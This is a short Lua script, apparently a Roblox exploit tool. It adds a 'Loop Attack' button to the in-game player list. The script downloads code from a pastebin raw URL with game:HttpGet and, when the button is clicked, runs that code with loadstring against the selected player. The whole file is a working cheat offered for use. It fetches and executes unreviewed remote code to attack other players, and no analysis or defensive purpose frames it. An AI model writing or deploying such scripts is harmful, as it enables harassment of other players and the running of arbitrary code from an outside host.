--//     Services     //--
local rs = game:GetService("ReplicatedStorage")
local plyrs = game:GetService("Players")

--//     Imports     //--
local attackData = game:HttpGet("https://pastebin.com/raw/EGNXK10Y", true)

--//     Variables     //--
local lp = plyrs.LocalPlayer

local PlayerGui = lp.PlayerGui
local SecondaryGui = PlayerGui.SecondaryGui
local ActionsPanel = SecondaryGui.PlayerList.List.ActionPanel

--//     Code     //--
local spectateStop = ActionsPanel.InfoButton:Clone()
spectateStop.Parent = ActionsPanel
spectateStop.Visible = true
spectateStop.Text = "Loop Attack"

spectateStop.MouseButton1Down:Connect(function()
	--if shared.Dispose() then shared.Dispose() end
	loadstring(attackData)()(ActionsPanel.TargetPlayerName.Value)
end)
